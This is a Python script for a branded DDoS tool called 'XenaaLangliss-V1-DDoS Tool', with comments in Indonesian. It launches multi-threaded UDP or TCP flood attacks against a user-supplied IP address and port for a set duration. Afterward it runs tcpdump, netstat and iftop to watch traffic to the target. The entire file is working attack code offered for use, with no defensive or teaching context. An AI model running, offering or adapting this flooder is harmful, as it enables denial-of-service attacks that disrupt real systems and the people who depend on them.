import socket
import sys
import threading
import time
import random
import re
import os

# Banner
def banner():
    print("""\033[0m
\033[31m       ╔═══════════════════════════════════════════════╗
\033[31m       ║     Welcome To \033[33mXenaaLangliss-V1-DDoS Tool     \033[31m║
\033[31m       ║        \033[0mLayer 4 Attack Tool (UDP & TCP)        \033[31m║
\033[31m       ║          Developer \x1b[38;2;255;20;147m: \033[0mXenaaLangliss            \033[31m║
\033[31m       ╚═══════════════════════════════════════════════╝
\033[0m""")

# Validasi IP Address
def is_valid_ip(ip):
    pattern = r"^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$"
    return re.match(pattern, ip)

# Validasi Port Number
def is_valid_port(port):
    return 1 <= port <= 65535

# Tampilkan Banner
banner()

# Cek Argumen
if len(sys.argv) < 7:
    print("\x1b[38;2;255;20;147m►► \033[0mUsage\x1b[38;2;255;20;147m: \033[0mpython3 \033[33mXenL4.py \033[0m<\033[32mtimes\033[0m> <\033[32mip\033[0m> <\033[32mport\033[0m> <\033[32mpacket\033[0m> <\033[32mthreads\033[0m> <\033[32mmode(udp/tcp)\033[0m>")
    sys.exit()

times = float(sys.argv[1])
ip = str(sys.argv[2])
port = int(sys.argv[3])
packet = int(sys.argv[4])
threads = int(sys.argv[5])
mode = str(sys.argv[6]).lower()

# Validasi IP & Port
if not is_valid_ip(ip):
    sys.exit("\x1b[31mInvalid IP address!")

if not is_valid_port(port):
    sys.exit("\x1b[31mInvalid port number! Must be between 1-65535.")

# Log Attack
def log_attack(ip, port, mode, packet, threads):
    print(f"\033[31m[XenaaLangliss]\033[0m Attacking... \033[33m> \033[0mtime: \033[32m{times} \033[0mip: \033[32m{ip}:{port} \033[0mpacket: \033[32m{packet} \033[0mthreads: \033[32m{threads} \033[0mmode: \033[32m{mode}\033[0m")

# UDP Attack Function
def udp_attack(ip, port, packet, times):
    timeout = time.time() + times
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    log_attack(ip, port, "UDP", packet, threads)

    while time.time() < timeout:
        try:
            data = random._urandom(1024)  # Ukuran paket tetap 1024 bytes
            for _ in range(packet):
                s.sendto(data, (ip, port))
        except:
            s.close()
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    print("\033[31m[XenaaLangliss]\033[0m Successfully UDP Attack!")

# TCP Attack Function
def tcp_attack(ip, port, packet, times):
    timeout = time.time() + times
    log_attack(ip, port, "TCP", packet, threads)

    while time.time() < timeout:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            s.connect((ip, port))
            data = random._urandom(1024)
            for _ in range(packet):
                s.sendall(data)
            s.shutdown(socket.SHUT_WR)
        except:
            pass

    print("\033[31m[XenaaLangliss]\033[0m Successfully TCP Attack!")

# Monitoring Function
def monitor_target(ip, port):
    print(f"\033[34m[Monitoring]\033[0m Monitoring traffic to \033[32m{ip}:{port}\033[0m")
    
    # Cek apakah `tcpdump` tersedia
    if os.system("which tcpdump > /dev/null") == 0:
        print("\033[34m[Monitoring]\033[0m Running tcpdump...")
        os.system(f"sudo tcpdump -i eth0 port {port} -nn -c 10")  # Tangkap 10 paket
    else:
        print("\033[31m[Error]\033[0m tcpdump not installed!")

    # Cek apakah `netstat` tersedia
    if os.system("which netstat > /dev/null") == 0:
        print("\033[34m[Monitoring]\033[0m Checking active connections...")
        os.system(f"netstat -an | grep :{port}")
    else:
        print("\033[31m[Error]\033[0m netstat not installed!")

    # Cek apakah `iftop` tersedia
    if os.system("which iftop > /dev/null") == 0:
        print("\033[34m[Monitoring]\033[0m Running iftop...")
        os.system(f"sudo iftop -i eth0 -n -B")
    else:
        print("\033[31m[Error]\033[0m iftop not installed!")

# Main Function
def main():
    global threads
    threads_list = []

    for _ in range(threads):
        if mode == "udp":
            th = threading.Thread(target=udp_attack, args=(ip, port, packet, times))
        elif mode == "tcp":
            th = threading.Thread(target=tcp_attack, args=(ip, port, packet, times))
        else:
            sys.exit("\x1b[31mInvalid mode! Use 'udp' or 'tcp'.")

        threads_list.append(th)
        th.start()

    for th in threads_list:
        th.join()

    # Jeda sebelum monitoring
    print("\033[33m[INFO]\033[0m Attack finished! Waiting 5 seconds before monitoring...")
    time.sleep(5)

    # Jalankan monitoring setelah serangan selesai
    monitor_target(ip, port)

# Run Script
if __name__ == '__main__':
    try:
        main()
    except KeyboardInterrupt:
        print('\x1b[31m[XenaaLangliss] \x1b[0mAttack Stopped!')
        sys.exit()
